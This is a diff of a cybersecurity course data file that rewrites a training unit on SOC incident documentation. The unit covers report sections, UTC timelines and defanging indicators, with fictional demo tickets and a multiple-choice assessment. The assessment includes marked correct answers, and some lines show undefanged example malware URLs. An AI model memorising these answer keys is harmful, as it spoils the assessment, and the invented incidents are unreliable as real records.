-            'Section 1: Executive Summary. A 3-sentence non-technical overview explaining What happened, What was affected, and Current status.',
-            'Section 2: Technical Findings & Evidence. Objective, factual observations linking process names, hashes, and parent PIDs.',
-            'Section 3: Defanged IOCs. Indicators of Compromise must always be defanged (e.g., `hxxp://badsite[.]com`, `185[.]220[.]101[.]5`) so readers do not click them accidentally.',
-            'Section 4: The UTC Timeline. Every single action must be recorded in Coordinated Universal Time (UTC) with ISO 8601 formatting to eliminate timezone confusion.',
+        "id": "topic-7-1",
+        "unitId": "unit-7",
+        "title": "Chapter 1: The 5 Pillars of Documentation & [Demo] SOC Ticket",
+        "order": 1,
+        "estimatedMinutes": 8,
+        "xpReward": 50,
+        "theory": {
+          "summaryLines": [
+            "In security operations, if an action was not documented, it legally and operationally never happened.",
+            "Pillar 1: Findings. Concise executive summary detailing what occurred, affected assets, and the root cause.",
+            "Pillar 2: Evidence. Technical artifacts including process command lines, SHA-256 hashes, IP addresses, domains, and log excerpts.",
+            "Pillar 3: Timeline. Chronological sequence of events in UTC from initial access to detection, containment, and recovery.",
+            "Pillar 4: Actions. Exact steps executed by analysts (e.g. host isolated at 03:18 UTC, password reset at 03:22 UTC, firewall block applied at 03:25 UTC).",
+            "Pillar 5: Recommendation. Strategic mitigations to prevent recurrence (e.g. disable Office macros, implement MFA on VPN, tune SIEM rule)."
           ],
-          knowMore: {
-            title: 'ISO 8601 Date and Time Standard',
-            description: 'Understand why international security operations standardizes on UTC formatting for forensic synchronicity.',
-            externalUrl: 'https://www.iso.org/iso-8601-date-and-time-format.html',
-            externalLabel: 'Review ISO 8601 Standards',
-          },
+          "knowMore": {
+            "title": "SANS Institute: Writing Effective Incident Reports for Management and Technical Teams",
+            "description": "Learn the industry benchmark for structuring incident documentation that withstands regulatory and judicial scrutiny.",
+            "externalUrl": "https://www.sans.org/white-papers/33349/",
+            "externalLabel": "SANS Incident Documentation"
+          }
         },
-        demo: {
-          title: 'Anatomy of a Professional SOC Ticket',
-          subtitle: 'Deconstructing a real-world enterprise incident record from Executive Summary to UTC Timeline.',
-          steps: [
-            {
-              stepNumber: 1,
-              title: 'The Executive Summary',
-              description: '"On 2026-09-29 at 14:15 UTC, host WKSTN-FIN-042 was compromised via an Excel macro stager. Host was isolated at 14:28 UTC. No data exfiltration detected."',
-              visualType: 'dashboard',
-              highlightElements: ['exec-summary', 'non-technical'],
-              narration: 'Clear, concise, and understandable by executives in 10 seconds.',
-            },
-            {
-              stepNumber: 2,
-              title: 'The Defanged Timeline',
-              description: 'All IPs (`185[.]220[.]101[.]5`) and domains (`evil-drop[.]xyz`) are defanged, and every event timestamp is recorded in UTC.',
-              visualType: 'terminal',
-              highlightElements: ['defanged-ioc', 'utc-timestamps'],
-              narration: 'Strict chronological ordering eliminates ambiguity across global timezones.',
-            },
-          ],
+        "demo": {
+                  "title": "[Demo] Turn Investigation Into a Record",
+                  "subtitle": "Watch a vague, unhelpful analyst note transform into a professional, audit-proof SOC investigation ticket",
+                  "steps": [
+                            {
+                                      "id": 1,
+                                      "stage": "1. The Poor Analyst Note",
+                                      "iconName": "attacker",
+                                      "title": "Vague, Incomplete Ticket Entry",
+                                      "description": "Analyst writes: 'Looked at alert. Seems suspicious. Closed.' Provides zero technical value to peers or auditors.",
+                                      "telemetrySnippet": "BAD NOTE: 'Looked at alert. Seems suspicious. Closed.' (NO entities, NO evidence, NO justification)",
+                                      "highlightText": "Incomplete notes force other analysts to redo work and fail regulatory compliance audits."
+                            },
+                            {
+                                      "id": 2,
+                                      "stage": "2. Adding What Happened",
+                                      "iconName": "endpoint",
+                                      "title": "Clear Incident Summary",
+                                      "description": "Summary added: 'Investigated Multiple Failed Logins for user Finance01 on host FIN-PC-04 originating from internal IP 10.10.20.15.'",
+                                      "telemetrySnippet": "SUMMARY: Alert ALT-2026-04 | User: Finance01 | Host: FIN-PC-04 | IP: 10.10.20.15 | Time: 10:32 AM",
+                                      "highlightText": "A strong summary immediately answers who, what, where, and when."
+                            },
+                            {
+                                      "id": 3,
+                                      "stage": "3. Attaching Technical Evidence",
+                                      "iconName": "server",
+                                      "title": "Citing Specific Event Logs",
+                                      "description": "Analyst logs exact timestamps: 4 failed attempts (Event 4625) followed by successful interactive logon (Event 4624) at 10:32:05.",
+                                      "telemetrySnippet": "EVIDENCE: Event 4625 (10:31:40, 10:31:44, 10:31:47, 10:31:52) -> Event 4624 Success (10:32:05)",
+                                      "highlightText": "Evidence citations prove your conclusions with verifiable log artifacts."
+                            },
+                            {
+                                      "id": 4,
+                                      "stage": "4. Documenting Verified Findings",
+                                      "iconName": "siem",
+                                      "title": "Explaining the Root Cause",
+                                      "description": "Analyst notes: 'Contacted user via phone; employee confirmed Caps Lock keyboard typo. No unauthorized processes spawned.'",
+                                      "telemetrySnippet": "FINDING: User mistyped password due to Caps Lock key. Clean process tree confirmed via EDR.",
+                                      "highlightText": "Documenting root-cause verification establishes why the activity occurred."
+                            },
+                            {
+                                      "id": 5,
+                                      "stage": "5. Disposition & Recommendations",
+                                      "iconName": "analyst",
+                                      "title": "Audit-Proof Ticket Complete",
+                                      "description": "Ticket closed as 'Benign False Positive (User Error)'. Ready for peer review, compliance inspection, and metrics tracking.",
+                                      "telemetrySnippet": "DISPOSITION: Closed - False Positive (User Error) | Recommendations: None | Audit Ready: YES",
+                                      "highlightText": "Professional documentation turns your investigation into a permanent, defensible enterprise record."
+                            }
+                  ]
         },
-        interactive: {
-          title: 'Ticket Section Anatomy & Defanging Practice',
-          scenario: 'Inspect 3 raw documentation entries and identify defanging and formatting compliance errors.',
-          cards: [
-            {
-              id: 'card-doc1',
-              title: 'Indicator Defanging Standard',
-              source: 'IOC Documentation Standards',
-              timestamp: 'Standardization Rule',
-              category: 'host',
-              summary: 'Active malicious link `http://malware-drop.com/payload.exe` defanged to `hxxp://malware-drop[.]com/payload.exe`.',
-              details: [
-                { label: 'Defanged URL', value: 'hxxp://malware-drop[.]com/payload[.]exe' },
-                { label: 'Defanged IP', value: '185[.]220[.]101[.]5' },
-                { label: 'Purpose', value: 'Prevents accidental clicks in ticketing and chat systems' },
-              ],
-              isSuspicious: false,
-              relevanceScore: 90,
-              tags: ['Defanging', 'IOC', 'Standard'],
-            },
-            {
-              id: 'card-doc2',
-              title: 'Timestamp Standardization: UTC vs Local',
-              source: 'Forensic Chronology Guide',
-              timestamp: '2026-09-29T14:15:00Z',
-              category: 'network',
-              summary: 'Using "3:00 PM EST" creates confusion for global teams in London and Tokyo. Standardize on `2026-09-29 19:15:00 UTC`.',
-              details: [
-                { label: 'Format', value: 'YYYY-MM-DD HH:MM:SS UTC' },
-                { label: 'Benefit', value: 'Synchronizes logs across multi-cloud and regional datacenters' },
-              ],
-              isSuspicious: false,
-              relevanceScore: 95,
-              tags: ['UTC', 'Chronology', 'ISO8601'],
-            },
-            {
-              id: 'card-doc3',
-              title: 'Objective Factual Phrasing',
-              source: 'Legal & Audit Documentation',
-              timestamp: 'Documentation Ethics',
-              category: 'user',
-              summary: 'Replace "User was dumb and clicked a scam" with "User opened phishing attachment containing malicious obfuscated macro."',
-              details: [
-                { label: 'Tone', value: 'Objective, blameless, professional, and audit-ready' },
-                { label: 'Standard', value: 'Adheres to corporate legal compliance protocols' },
-              ],
-              isSuspicious: false,
-              relevanceScore: 92,
-              tags: ['Objective', 'Blameless', 'Audit'],
-            },
-          ],
+        "interactive": {
+                  "title": "[Interactive] Build the Analyst Note",
+                  "scenario": "Assemble the core components of a professional SOC investigation note in their proper logical order.",
+                  "cards": [
+                            {
+                                      "id": "note-sum",
+                                      "category": "User",
+                                      "label": "1. Incident Summary",
+                                      "summary": "Clear statement of the alert type, affected user (Finance01), host (FIN-PC-04), and timestamp.",
+                                      "detailedFindings": "Component 1: Summarizes the alert background and target entities.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "note-ent",
+                                      "category": "Source IP",
+                                      "label": "2. Core Entities & Scoping",
+                                      "summary": "Detailed User, Host, IP, and subnet context extracted during initial triage.",
+                                      "detailedFindings": "Component 2: Scopes the exact boundary of the affected systems.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "note-ev",
+                                      "category": "Event ID",
+                                      "label": "3. Chronological Evidence",
+                                      "summary": "Exact log timestamps: 4 failed attempts followed by successful Event 4624 at 10:32:05.",
+                                      "detailedFindings": "Component 3: Concrete technical artifacts supporting the analysis.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "note-find",
+                                      "category": "Timeline",
+                                      "label": "4. Analyst Finding & Root Cause",
+                                      "summary": "User verified password typo via telephone; clean process tree confirmed in EDR.",
+                                      "detailedFindings": "Component 4: Explains what caused the anomaly and validates safety.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "note-disp",
+                                      "category": "Timeline",
+                                      "label": "5. Action & Final Disposition",
+                                      "summary": "Ticket closed as Benign False Positive (User Error); audit-ready.",
+                                      "detailedFindings": "Component 5: Concludes ticket with clear classification.",
+                                      "severityIndicator": "Normal"
+                            }
+                  ]
         },
-        socContext: {
-          title: 'The Accidental Click Disaster',
-          scenario: 'An analyst pasted a live malware link `http://evil-c2.com/worm.exe` into a shared ticket. A junior engineer clicked the link out of curiosity, infecting the SOC operations workstation.',
-          analystMindset: 'Always defang every single indicator (`hxxp`, brackets around dots). Make it impossible for anyone to execute an indicator accidentally.',
-          bestPractices: [
-            'Defang all URLs as `hxxp://` and wrap IP dots in brackets: `192[.]168[.]1[.]1`.',
-            'Record all event times exclusively in UTC with explicit timezone notation.',
-            'Include the SHA256 file hash for every observed binary artifact.',
-          ],
+        "socContext": {
+          "title": "Documentation for Incident Retrospectives and Audits",
+          "scenario": "Six months after an incident, insurance auditors investigate a $1M cyber claim and request ticket records for proof of timely containment.",
+          "analystMindset": "Write every ticket as if it will be read aloud in a courtroom by opposing counsel or examined by financial auditors.",
+          "bestPractices": [
+            "Standardize on ISO 8601 UTC timestamps (YYYY-MM-DDTHH:MM:SSZ).",
+            "Always link related tickets (parent case, change requests, EDR alerts).",
+            "Never edit or delete historical timestamps—append update notes sequentially."
+          ]
         },
-        knowledgeCheck: {
-          matching: {
-            title: 'Match Ticket Section to Required Contents',
-            instructions: 'Pair each ticket section with its appropriate contents.',
-            pairs: [
-              { id: 'ts-1', left: 'Executive Summary', right: 'High-level non-technical summary of breach impact and current status' },
-              { id: 'ts-2', left: 'Technical Timeline', right: 'Chronological UTC sequence of attacker activity and analyst actions' },
-              { id: 'ts-3', left: 'IOC Table', right: 'Defanged list of observed file hashes, malicious IPs, and domains' },
-              { id: 'ts-4', left: 'Remediation Actions', right: 'Verification of host isolation, credential resets, and rule updates' },
+        "knowledgeCheck": {
+          "dragDrop": {
+            "title": "Arrange the 5 Core Documentation Pillars",
+            "instructions": "Order the five essential sections of an audit-grade SOC incident report.",
+            "items": [
+              {
+                "id": "dp-1",
+                "label": "Executive Summary & Findings (Root-cause overview for management)",
+                "order": 1
+              },
+              {
+                "id": "dp-2",
+                "label": "Forensic Evidence (Hashes, IPs, command lines, log snippets)",
+                "order": 2
+              },
+              {
+                "id": "dp-3",
+                "label": "Chronological Timeline (UTC timestamps from access to containment)",
+                "order": 3
+              },
+              {
+                "id": "dp-4",
+                "label": "Actions Taken (EDR containment, host isolation, account resets)",
+                "order": 4
+              },
+              {
+                "id": "dp-5",
+                "label": "Remediation Recommendations (GPO hardening, firewall rules, user training)",
+                "order": 5
+              }
             ],
-            explanation: 'Clean section separation allows technical engineers, auditors, and executives to extract what they need immediately.',
-          },
-        },
+            "explanation": "Reports begin with executive findings, present evidence and timeline, record containment actions, and finish with prevention recommendations."
+          }
+        }
       },
       {
-        id: 'topic-7-2',
-        unitId: 'unit-7',
-        title: 'Actions, Recommendations & Incident Ticketing Lab',
-        order: 2,
-        estimatedMinutes: 25,
-        xpReward: 60,
-        theory: {
-          summaryLines: [
-            'The conclusion of every incident record consists of two forward-looking sections: Actions Taken and Recommendations.',
-            'Actions Taken: The immediate containment and eradication steps performed (e.g. host isolated from network via EDR at 14:28 UTC, user password revoked in Entra ID at 14:32 UTC).',
-            'Remediation Recommendations: Long-term architectural fixes to prevent recurrence (e.g. enforce attack surface reduction rule blocking Office child processes, mandate FIDO2 MFA).',
-            'Post-Incident Review (PIR): Document lessons learned to continuously refine detection rules, playbooks, and training.',
-            'In the following hands-on lab, you will synthesize everything learned to build an official incident ticket.',
+        "id": "topic-7-2",
+        "unitId": "unit-7",
+        "title": "Chapter 2: [Lab] 🖥️ Create Incident Ticket",
+        "order": 2,
+        "estimatedMinutes": 7,
+        "xpReward": 75,
+        "theory": {
+          "summaryLines": [
+            "Creating an incident ticket is the culminating practical skill of a Tier 1 SOC Analyst.",
+            "Every ticket must include standard fields: Incident Title, Severity Level, Affected Asset, User ID, Detection Source, and Status.",
+            "The Investigation Narrative must clearly explain the attack chain from initial access through execution, persistence, and C2 communication.",
+            "Containment Verification: Explicitly state the exact timestamp when network isolation was verified.",
+            "Closing Codes: Ensure accurate resolution categorization (True Positive - Contained, False Positive - Tuned, Benign - Expected)."
           ],
-          knowMore: {
-            title: 'CISA Incident Response Plan Basics',
-            description: 'Official US Cybersecurity and Infrastructure Security Agency guidelines on post-incident remediation and lessons learned.',
-            externalUrl: 'https://www.cisa.gov/',
-            externalLabel: 'Explore CISA Incident Guidelines',
-          },
+          "knowMore": {
+            "title": "NIST Computer Security Incident Handling: Section 3.4 Documentation",
+            "description": "Review official guidelines on maintaining incident documentation logs and evidence checklists.",
+            "externalUrl": "https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final",
+            "externalLabel": "NIST SP 800-61 Documentation"
+          }
         },
-        demo: {
-          title: 'From Live Incident to Completed SecOps Ticket',
-          subtitle: 'Interactive generation of an enterprise-grade incident ticket.',
-          steps: [
-            {
-              stepNumber: 1,
-              title: 'Drafting Actions Taken',
-              description: 'Record containment actions with exact UTC timestamps: "14:28 UTC: EDR network isolation invoked on WKSTN-FIN-042."',
-              visualType: 'terminal',
-              highlightElements: ['containment-actions', 'timestamped'],
-              narration: 'Documenting exact containment times proves compliance with corporate SLAs.',
-            },
-            {
-              stepNumber: 2,
-              title: 'Drafting Strategic Recommendations',
-              description: 'Provide actionable defense-in-depth advice: "Configure Microsoft Defender ASR rule: Block Office applications from creating child processes."',
-              visualType: 'dashboard',
-              highlightElements: ['strategic-recommendations', 'asr-rule'],
-              narration: 'Recommendations transform an isolated incident into permanent organizational resilience.',
-            },
-          ],
+        "demo": {
+                  "title": "[Demo] From Alert to Case Record",
+                  "subtitle": "See how all findings from the FinCorp investigation come together in a complete incident ticket record",
+                  "steps": [
+                            {
+                                      "id": 1,
+                                      "stage": "1. Case Ingestion & Scoping",
+                                      "iconName": "siem",
+                                      "title": "Ticket Header & Metadata Populated",
+                                      "description": "Ticket #2026-04 opened in case management. Alert ID ALT-2026-04, FinCorp finance subnet, initial Medium severity.",
+                                      "telemetrySnippet": "TICKET HEADER: Case #2026-04 | Title: Failed Login Spike | Subnet: Finance LAN | Severity: Medium",
+                                      "highlightText": "Standardized ticket headers ensure cases are easily indexed and searched."
+                            },
+                            {
+                                      "id": 2,
+                                      "stage": "2. Entity Information Recorded",
+                                      "iconName": "endpoint",
+                                      "title": "User, Host, and Network Details",
+                                      "description": "User: Finance01 (Billing clerk) | Host: FIN-PC-04 | Source IP: 10.10.20.15 | Subnet: Internal VLAN 20.",
+                                      "telemetrySnippet": "ENTITIES: User=Finance01 | Host=FIN-PC-04 | IP=10.10.20.15 | Asset Criticality=Standard",
+                                      "highlightText": "Recording entity metadata enables automated correlation across past and future cases."
+                            },
+                            {
+                                      "id": 3,
+                                      "stage": "3. Chronological Timeline Attached",
+                                      "iconName": "server",
+                                      "title": "Chronological Sequence of Events",
+                                      "description": "10:31:40 to 10:31:52: Four failed attempts (Event 4625). 10:32:05: Successful interactive logon (Event 4624).",
+                                      "telemetrySnippet": "TIMELINE: 10:31:40 (Fail) -> 10:31:44 (Fail) -> 10:31:47 (Fail) -> 10:31:52 (Fail) -> 10:32:05 (Success)",
+                                      "highlightText": "The chronological timeline provides a complete replay of what transpired."
+                            },
+                            {
+                                      "id": 4,
+                                      "stage": "4. Investigative Actions & Verification",
+                                      "iconName": "analyst",
+                                      "title": "Verification Call & Host Inspection",
+                                      "description": "Analyst contacted Finance01 to verify typo; EDR process tree inspected with 0 suspicious child processes spawned.",
+                                      "telemetrySnippet": "ACTIONS: Direct user verification completed | EDR process inspection: 0 anomalies | Host safe",
+                                      "highlightText": "Active verification proves the analyst validated the host before closing the case."
+                            },
+                            {
+                                      "id": 5,
+                                      "stage": "5. Final Resolution & Closure",
+                                      "iconName": "analyst",
+                                      "title": "Audit-Ready Case Closed",
+                                      "description": "Ticket resolved as 'Closed — Benign False Positive (User Error)'. Archived in audit database for compliance review.",
+                                      "telemetrySnippet": "FINAL STATUS: Closed | Disposition: Benign False Positive | SLA: Met (18m / 30m) | Signoff: L1 Analyst",
+                                      "highlightText": "A properly closed ticket provides defensible documentation that withstands compliance scrutiny."
+                            }
+                  ]
         },
-        interactive: {
-          title: 'Hands-On Lab: Create an Incident Ticket',
-          scenario: 'Build an official incident ticket for a confirmed living-off-the-land malware attack. Fill in the required fields, defang IOCs, and verify against standards.',
-          cards: [
-            {
-              id: 'card-lab-tkt',
-              title: 'Raw Incident Briefing [Incident #INC-9014]',
-              source: 'SecOps Incident Queue',
-              timestamp: '2026-09-29T14:35:00Z',
-              category: 'host',
-              summary: 'Phishing email with attachment `Invoice_Q3.xlsm` opened by `jdoe-finance` on host `WKSTN-FIN-042`. Obfuscated PowerShell downloaded stager from `185.220.101.5`. Host isolated by L1 analyst.',
-              details: [
-                { label: 'Priority', value: 'High (P2)' },
-                { label: 'Status', value: 'Contained / Pending Remediation Ticket' },
-                { label: 'Required Output', value: 'Executive Summary, Defanged IOCs, UTC Timeline, Containment Actions, Recommendations' },
-              ],
-              isSuspicious: true,
-              relevanceScore: 100,
-              tags: ['Lab-Ticket', 'SecOps', 'Documentation'],
-            },
-          ],
+        "interactive": {
+                  "title": "[Interactive] Complete the Case Record",
+                  "scenario": "Place the available investigation findings from FinCorp alert ALT-2026-04 into their correct ticket fields.",
+                  "cards": [
+                            {
+                                      "id": "rec-ent",
+                                      "category": "User",
+                                      "label": "Target Entity Details",
+                                      "summary": "User: Finance01 | Host: FIN-PC-04 | Source IP: 10.10.20.15.",
+                                      "detailedFindings": "Field: Target Entities. Records the affected identity, workstation asset, and network location.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "rec-time",
+                                      "category": "Timeline",
+                                      "label": "Event Chronology",
+                                      "summary": "10:31:40-10:31:52 (Failures) -> 10:32:05 (Logon Success).",
+                                      "detailedFindings": "Field: Timeline. Chronological sequence of authentications demonstrating user recovery.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "rec-ev",
+                                      "category": "Event ID",
+                                      "label": "Verification Evidence",
+                                      "summary": "User confirmed password mistype; clean process trees verified in EDR telemetry.",
+                                      "detailedFindings": "Field: Verification Findings. Confirms root cause and absence of adversary persistence.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "rec-disp",
+                                      "category": "Source IP",
+                                      "label": "Final Ticket Disposition",
+                                      "summary": "Closed — Benign False Positive (User Error).",
+                                      "detailedFindings": "Field: Disposition. Formal audit resolution closing the investigation.",
+                                      "severityIndicator": "Normal"
+                            }
+                  ]
         },
-        socContext: {
-          title: 'The Audit Trail Standard',
-          scenario: 'Two years after an intrusion, federal compliance auditors reviewed ticket #INC-9014 during a financial audit.',
-          analystMindset: 'Because the ticket contained defanged IOCs, a precise UTC timeline, and verified containment logs, the company passed the audit with zero regulatory penalties.',
-          bestPractices: [
-            'Always link containment confirmation logs directly into the incident record.',
-            'Include recommendations that address the root cause, not just the symptom.',
-            'Conduct a Post-Incident Review meeting within 5 business days of incident closure.',
-          ],
+        "socContext": {
+          "title": "The Post-Incident Review (Lessons Learned)",
+          "scenario": "Following a major malware outbreak, the CISO hosts a Blameless Post-Mortem to determine how defenses failed.",
+          "analystMindset": "A post-mortem does not assign blame to people; it identifies systemic gaps in technology and process so the enterprise improves.",
+          "bestPractices": [
+            "Participate actively in post-incident reviews with actionable feedback.",
+            "Update relevant playbooks immediately if gaps were discovered during triage.",
+            "Ensure all remediation tasks have assigned owners and completion target dates."
+          ]
         },
-        knowledgeCheck: {
-          dragDrop: {
-            title: 'Arrange Incident Closure Workflow',
-            instructions: 'Order the steps from initial containment to final ticket archive.',
-            items: [
-              { id: 'cw-1', label: '1. Execute and document immediate containment actions with UTC timestamps', category: 'Phase 1' },
-              { id: 'cw-2', label: '2. Compile defanged IOC table and verify host clean re-image', category: 'Phase 2' },
-              { id: 'cw-3', label: '3. Draft strategic preventative recommendations (e.g. ASR rules)', category: 'Phase 3' },
-              { id: 'cw-4', label: '4. Complete Post-Incident Review (PIR) and archive case ticket', category: 'Phase 4' },
+        "knowledgeCheck": {
+          "triageScenario": {
+            "id": "ts-doc-lab",
+            "alertName": "Case CASE-2026-04: Incident Closure & Post-Mortem Verification",
+            "severity": "HIGH",
+            "scenarioText": "L1 Analyst is completing the formal closure checklist for CASE-2026-04 (Brute Force Credential Compromise on FIN-PC-04). Workstation FIN-PC-04 was isolated within 11 minutes, user Finance01 password reset, and perimeter firewalls blocked the malicious Tor IP 198.51.100.25.",
+            "evidenceItems": [
+              {
+                "label": "Containment SLA",
+                "value": "Workstation FIN-PC-04 Isolated at 02:51 UTC (11 mins into 60 min SLA)",
+                "insight": "All containment SLAs met successfully"
+              },
+              {
+                "label": "Identity Remediation",
+                "value": "Finance01 Password Reset & Kerberos Tickets Purged",
+                "insight": "Adversary session terminated and credentials invalidated"
+              },
+              {
+                "label": "Lessons Learned Action",
+                "value": "GPO lockout policy updated from 10 attempts to 5 attempts",
+                "insight": "Systemic preventive hardening implemented"
+              }
             ],
-            explanation: 'The closure workflow transitions operations from active defense into long-term organizational hardening.',
-          },
-        },
-      },
+            "correctVerdict": "TRUE_POSITIVE",
+            "rationale": "The incident was a confirmed True Positive attack that has now been fully contained, eradicated, and remediated with complete root-cause documentation and preventive GPO hardening.",
+            "analystAction": "Finalize audit notes with all 5 documentation pillars, attach EDR containment logs, and transition case status to Resolved / Closed."
+          }
+        }
+      }
     ],
-    assessment: {
-      id: 'unit-7-assessment',
-      title: 'Unit 7 Assessment: SOC Documentation',
-      passingScore: 80,
-      xpReward: 200,
-      questions: [
+    "assessment": {
+      "id": "unit-7-assessment",
+      "title": "Unit 7 Assessment: SOC Documentation Standards",
+      "passingScore": 75,
+      "xpReward": 100,
+      "questions": [
         {
-          id: 'u7-q1',
-          question: 'Why must Indicators of Compromise (IOCs) such as URLs and IP addresses always be defanged in incident tickets?',
-          options: [
-            'Because SIEM software cannot parse letters and numbers',
-            'To prevent analysts, readers, or automated tools from accidentally clicking or resolving malicious links',
-            'To translate the IP address into hexadecimal code',
-            'Because defanging makes the ticket load faster',
+          "id": "u7-q1",
+          "question": "What are the five core pillars of an audit-grade SOC incident report?",
+          "options": [
+            "Intro, Body, Conclusion, Footnotes, Appendix",
+            "Findings, Evidence, Timeline, Actions, Recommendations",
+            "User, Password, IP, Port, Protocol",
+            "Detection, Prevention, Destruction, Recovery, Payment"
           ],
-          correctAnswer: 1,
-          explanation: 'Defanging (`hxxp://`, `192[.]168...`) turns live clickable links into harmless text, preventing accidental self-infection.',
+          "correctAnswer": 1,
+          "explanation": "The five pillars are Findings (Summary), Evidence (Technical IOCs), Timeline (Chronology), Actions (Containment), and Recommendations (Future hardening)."
         },
         {
-          id: 'u7-q2',
-          question: 'Which timestamp standard must be used across all professional SOC incident notes and timelines?',
-          options: [
-            'Local workstation time with no timezone indicator',
-            'UTC (Coordinated Universal Time) with standard ISO 8601 formatting',
-            'The timezone of the software vendor\'s headquarters',
-            'Approximate time (e.g. "sometime yesterday afternoon")',
+          "id": "u7-q2",
+          "question": "Why must timestamps in security documentation always be recorded in UTC (Coordinated Universal Time)?",
+          "options": [
+            "UTC looks more professional on paper",
+            "Enterprises have assets spread across multiple global timezones; standardizing on UTC prevents chronological ambiguity during cross-system correlation",
+            "Computers can only understand UTC time",
+            "Local daylight savings time is illegal in cybersecurity"
           ],
-          correctAnswer: 1,
-          explanation: 'UTC eliminates ambiguities caused by daylight savings time and multi-regional corporate infrastructure.',
+          "correctAnswer": 1,
+          "explanation": "Standardizing on UTC eliminates confusion across distributed systems, multi-national assets, and daylight savings transitions."
         },
         {
-          id: 'u7-q3',
-          question: 'What is the purpose of the Executive Summary section in an incident ticket?',
-          options: [
-            'To list every single raw log line collected during the day',
-            'To provide a concise, non-technical overview explaining what happened, the business impact, and current status for leadership',
-            'To complain about the shift schedule and workload',
-            'To write a fictional story about the hacker',
+          "id": "u7-q3",
+          "question": "What is the primary objective of the \"Recommendations\" section in an incident ticket?",
+          "options": [
+            "To criticize the user who made a mistake",
+            "To propose strategic preventative technical and policy controls that stop similar attacks from recurring",
+            "To request a salary increase for the analyst",
+            "To recommend purchasing more computer monitors"
           ],
-          correctAnswer: 1,
-          explanation: 'The Executive Summary allows managers, executives, and legal counsel to understand the business risk in seconds.',
+          "correctAnswer": 1,
+          "explanation": "Recommendations turn incident lessons into permanent defensive hardening (e.g. GPO restrictions, MFA enforcement, firewall rules)."
         },
         {
-          id: 'u7-q4',
-          question: 'Why should incident recommendations focus on root-cause architecture rather than just cleaning the infected laptop?',
-          options: [
-            'Cleaning a laptop is illegal under federal law',
-            'Without fixing root-cause weaknesses (e.g. enabling ASR rules or MFA), the adversary will compromise the organization again using identical methods',
-            'Because laptops cannot be re-imaged more than once',
-            'Recommendations are optional and never reviewed by anyone',
+          "id": "u7-q4",
+          "question": "If an analyst isolates an infected host but fails to document the action in the incident ticket, what is the consequence during an audit?",
+          "options": [
+            "Nothing, verbal confirmation is always sufficient",
+            "The action is considered unverified or unperformed, potentially causing regulatory compliance failure or legal liability",
+            "The ticketing system automatically deletes the case",
+            "The host reconnects itself automatically"
           ],
-          correctAnswer: 1,
-          explanation: 'Remediation must eliminate the root vulnerability so the same attack vector cannot succeed twice.',
-        },
-        {
-          id: 'u7-q5',
-          question: 'What information must be recorded in the Actions Taken section of an incident ticket?',
-          options: [
-            'The names of all songs listened to by the analyst',
-            'The exact containment, eradication, and credential revocation steps performed, complete with UTC timestamps',
-            'Only the serial number of the office printer',
-            'A list of websites blocked by the web browser',
-          ],
-          correctAnswer: 1,
-          explanation: 'Timestamped containment logs provide definitive audit proof of SLA compliance and operational containment.',
-        },
-      ],
-    },
-  },
+          "correctAnswer": 1,
+          "explanation": "In security operations and compliance audits: \"If it was not documented in the ticket, it never happened.\""
+        }
+      ]
+    }
+  }
 ];
